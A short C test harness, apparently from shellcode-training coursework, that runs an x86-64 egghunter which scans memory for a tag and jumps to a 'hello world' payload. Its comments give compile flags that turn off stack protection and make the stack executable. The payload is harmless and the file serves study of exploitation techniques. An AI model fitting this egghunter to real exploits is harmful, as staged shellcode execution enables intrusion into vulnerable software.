/* http://shell-storm.org/shellcode/files/shellcode-806.php

// generate shell code  & compile
 
$ for i in `objdump -d exit_shellcode | grep "^ " | cut -f2`; do echo -n '\x'$i; done; echo
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode

*/
#include <stdio.h>
#include <string.h>

unsigned char egghunter[] = \
"\x31\xd2\x66\x81\xca\xff\x0f\xff\xc2\x67\x48\x8d\x7a\x04\x6a\x15\x58\x0f\x05\x3c\xf2\x74\xeb\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe6\xaf\x75\xe3\xff\xe7";


unsigned char egg[] = \
"\x90\x50\x90\x50"	// egg tag
"\x90\x50\x90\x50"	// egg tag

// hello world shellcode 
"\xeb\x0e\x48\x65\x6c\x6c\x6f\x20\x53\x4c\x41\x45\x36\x34\x21\x0a\x48\x31\xc0\xb0\x01\x48\x89\xc7\x48\x8d\x35\xe3\xff\xff\xff\x48\x31\xd2\xb2\x0e\x0f\x05\x48\x31\xc0\x83\xc0\x3c\x48\x31\xff\x0f\x05";


int main()
{
	printf("Egghunter shellcode Length: %d\n", (int)strlen(egghunter));
	printf("Egg shellcode Length: %d\n", (int)strlen(egg));
	int (*ret)() = (int(*)())egghunter;
	ret();
}
